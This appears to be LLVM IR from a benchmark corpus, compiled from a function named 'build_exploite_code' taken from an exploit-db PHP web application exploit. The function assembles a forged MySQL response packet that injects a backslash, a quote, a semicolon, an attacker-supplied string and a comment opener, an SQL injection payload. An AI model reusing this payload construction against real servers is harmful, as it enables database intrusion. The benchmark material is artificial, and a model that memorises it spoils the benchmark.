; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_309.c_build_exploite_code.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_309.c_build_exploite_code.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.build_exploite_code.my1 = private unnamed_addr constant [21 x i8] c"\01\00\00\01\01\1B\00\00\02\00\0FTables_in_", align 16
@__const.build_exploite_code.my2 = private unnamed_addr constant [15 x i8] c"\03@\00\00\01\FE\03\01\00\1F\01\00\00\03\FE", align 1
@__const.build_exploite_code.my3 = private unnamed_addr constant [3 x i8] c"\00\00\04", align 1
@__const.build_exploite_code.my4 = private unnamed_addr constant [5 x i8] c"\01\00\00\05\FE", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @build_exploite_code(i8* %0, i8* %1, i8** %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8**, align 8
  %7 = alloca [21 x i8], align 16
  %8 = alloca [15 x i8], align 1
  %9 = alloca [3 x i8], align 1
  %10 = alloca [5 x i8], align 1
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i8** %2, i8*** %6, align 8
  %13 = bitcast [21 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([21 x i8], [21 x i8]* @__const.build_exploite_code.my1, i32 0, i32 0), i64 21, i1 false)
  %14 = bitcast [15 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %14, i8* align 1 getelementptr inbounds ([15 x i8], [15 x i8]* @__const.build_exploite_code.my2, i32 0, i32 0), i64 15, i1 false)
  %15 = bitcast [3 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %15, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.build_exploite_code.my3, i32 0, i32 0), i64 3, i1 false)
  %16 = bitcast [5 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %16, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.build_exploite_code.my4, i32 0, i32 0), i64 5, i1 false)
  %17 = load i8*, i8** %4, align 8
  %18 = call i32 @strlen(i8* %17)
  %19 = add nsw i32 21, %18
  %20 = add nsw i32 %19, 15
  %21 = add nsw i32 %20, 1
  %22 = add nsw i32 %21, 3
  %23 = add nsw i32 %22, 1
  %24 = load i8*, i8** %5, align 8
  %25 = call i32 @strlen(i8* %24)
  %26 = add nsw i32 %23, %25
  %27 = add nsw i32 %26, 5
  %28 = add nsw i32 %27, 5
  store i32 %28, i32* %11, align 4
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = mul i64 1, %30
  %32 = trunc i64 %31 to i32
  %33 = call i64 @malloc(i32 %32)
  %34 = inttoptr i64 %33 to i8*
  %35 = load i8**, i8*** %6, align 8
  store i8* %34, i8** %35, align 8
  store i32 0, i32* %12, align 4
  %36 = getelementptr inbounds [21 x i8], [21 x i8]* %7, i64 0, i64 0
  %37 = load i8**, i8*** %6, align 8
  %38 = load i8*, i8** %37, align 8
  %39 = load i32, i32* %12, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = call i32 @bcopy(i8* %36, i8* %41, i32 21)
  %43 = load i32, i32* %12, align 4
  %44 = add nsw i32 %43, 21
  store i32 %44, i32* %12, align 4
  %45 = load i8*, i8** %4, align 8
  %46 = load i8**, i8*** %6, align 8
  %47 = load i8*, i8** %46, align 8
  %48 = load i32, i32* %12, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i8*, i8** %4, align 8
  %52 = call i32 @strlen(i8* %51)
  %53 = call i32 @bcopy(i8* %45, i8* %50, i32 %52)
  %54 = load i8*, i8** %4, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = load i32, i32* %12, align 4
  %57 = add nsw i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = getelementptr inbounds [15 x i8], [15 x i8]* %8, i64 0, i64 0
  %59 = load i8**, i8*** %6, align 8
  %60 = load i8*, i8** %59, align 8
  %61 = load i32, i32* %12, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = call i32 @bcopy(i8* %58, i8* %63, i32 15)
  %65 = load i32, i32* %12, align 4
  %66 = add nsw i32 %65, 15
  store i32 %66, i32* %12, align 4
  %67 = load i8*, i8** %5, align 8
  %68 = call i32 @strlen(i8* %67)
  %69 = add nsw i32 5, %68
  %70 = add nsw i32 %69, 1
  %71 = trunc i32 %70 to i8
  %72 = load i8**, i8*** %6, align 8
  %73 = load i8*, i8** %72, align 8
  %74 = load i32, i32* %12, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  store i8 %71, i8* %76, align 1
  %77 = load i32, i32* %12, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %12, align 4
  %79 = getelementptr inbounds [3 x i8], [3 x i8]* %9, i64 0, i64 0
  %80 = load i8**, i8*** %6, align 8
  %81 = load i8*, i8** %80, align 8
  %82 = load i32, i32* %12, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = call i32 @bcopy(i8* %79, i8* %84, i32 3)
  %86 = load i32, i32* %12, align 4
  %87 = add nsw i32 %86, 3
  store i32 %87, i32* %12, align 4
  %88 = load i8*, i8** %5, align 8
  %89 = call i32 @strlen(i8* %88)
  %90 = add nsw i32 5, %89
  %91 = trunc i32 %90 to i8
  %92 = load i8**, i8*** %6, align 8
  %93 = load i8*, i8** %92, align 8
  %94 = load i32, i32* %12, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %12, align 4
  %96 = sext i32 %94 to i64
  %97 = getelementptr inbounds i8, i8* %93, i64 %96
  store i8 %91, i8* %97, align 1
  %98 = load i8**, i8*** %6, align 8
  %99 = load i8*, i8** %98, align 8
  %100 = load i32, i32* %12, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %12, align 4
  %102 = sext i32 %100 to i64
  %103 = getelementptr inbounds i8, i8* %99, i64 %102
  store i8 92, i8* %103, align 1
  %104 = load i8**, i8*** %6, align 8
  %105 = load i8*, i8** %104, align 8
  %106 = load i32, i32* %12, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %12, align 4
  %108 = sext i32 %106 to i64
  %109 = getelementptr inbounds i8, i8* %105, i64 %108
  store i8 39, i8* %109, align 1
  %110 = load i8**, i8*** %6, align 8
  %111 = load i8*, i8** %110, align 8
  %112 = load i32, i32* %12, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %12, align 4
  %114 = sext i32 %112 to i64
  %115 = getelementptr inbounds i8, i8* %111, i64 %114
  store i8 59, i8* %115, align 1
  %116 = load i8*, i8** %5, align 8
  %117 = load i8**, i8*** %6, align 8
  %118 = load i8*, i8** %117, align 8
  %119 = load i32, i32* %12, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8, i8* %118, i64 %120
  %122 = load i8*, i8** %5, align 8
  %123 = call i32 @strlen(i8* %122)
  %124 = call i32 @bcopy(i8* %116, i8* %121, i32 %123)
  %125 = load i8*, i8** %5, align 8
  %126 = call i32 @strlen(i8* %125)
  %127 = load i32, i32* %12, align 4
  %128 = add nsw i32 %127, %126
  store i32 %128, i32* %12, align 4
  %129 = load i8**, i8*** %6, align 8
  %130 = load i8*, i8** %129, align 8
  %131 = load i32, i32* %12, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %12, align 4
  %133 = sext i32 %131 to i64
  %134 = getelementptr inbounds i8, i8* %130, i64 %133
  store i8 47, i8* %134, align 1
  %135 = load i8**, i8*** %6, align 8
  %136 = load i8*, i8** %135, align 8
  %137 = load i32, i32* %12, align 4
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* %12, align 4
  %139 = sext i32 %137 to i64
  %140 = getelementptr inbounds i8, i8* %136, i64 %139
  store i8 42, i8* %140, align 1
  %141 = getelementptr inbounds [5 x i8], [5 x i8]* %10, i64 0, i64 0
  %142 = load i8**, i8*** %6, align 8
  %143 = load i8*, i8** %142, align 8
  %144 = load i32, i32* %12, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %143, i64 %145
  %147 = call i32 @bcopy(i8* %141, i8* %146, i32 5)
  %148 = load i32, i32* %11, align 4
  ret i32 %148
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @bcopy(i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
